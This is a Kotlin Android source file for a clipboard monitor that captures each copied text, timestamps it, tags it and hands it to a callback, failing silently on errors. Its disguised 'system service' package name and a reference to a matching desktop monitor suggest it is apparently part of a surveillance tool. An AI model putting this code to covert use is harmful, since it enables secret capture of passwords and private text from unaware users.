package com.system.service.monitor

import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Clipboard Monitor — watches for clipboard changes and captures text content.
 * Equivalent to the desktop's clipboardMonitor.
 * Uses Android's ClipboardManager.OnPrimaryClipChangedListener.
 */
class ClipboardMonitor(
    private val context: Context,
    private val callback: (String) -> Unit
) {

    private var clipboardManager: ClipboardManager? = null
    private var lastContent = ""
    private val handler = Handler(Looper.getMainLooper())

    private val listener = ClipboardManager.OnPrimaryClipChangedListener {
        readClipboard()
    }

    fun start() {
        handler.post {
            clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            clipboardManager?.addPrimaryClipChangedListener(listener)
        }
    }

    fun stop() {
        handler.post {
            clipboardManager?.removePrimaryClipChangedListener(listener)
        }
    }

    private fun readClipboard() {
        try {
            val clip = clipboardManager?.primaryClip ?: return
            if (clip.itemCount == 0) return

            val item = clip.getItemAt(0)
            var text = item.text?.toString() ?: item.coerceToText(context)?.toString() ?: return

            if (text.isBlank()) return

            // Deduplicate
            if (text == lastContent) return
            lastContent = text

            // Truncate very long content (max 2000 chars, same as desktop)
            if (text.length > 2000) {
                text = text.take(2000) + "... [TRUNCATED]"
            }

            text = text.trim()
            if (text.isBlank()) return

            val ts = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            callback("[$ts] [CLIPBOARD] $text")
        } catch (_: Exception) {
            // SecurityException on some OEMs, silent failure
        }
    }
}
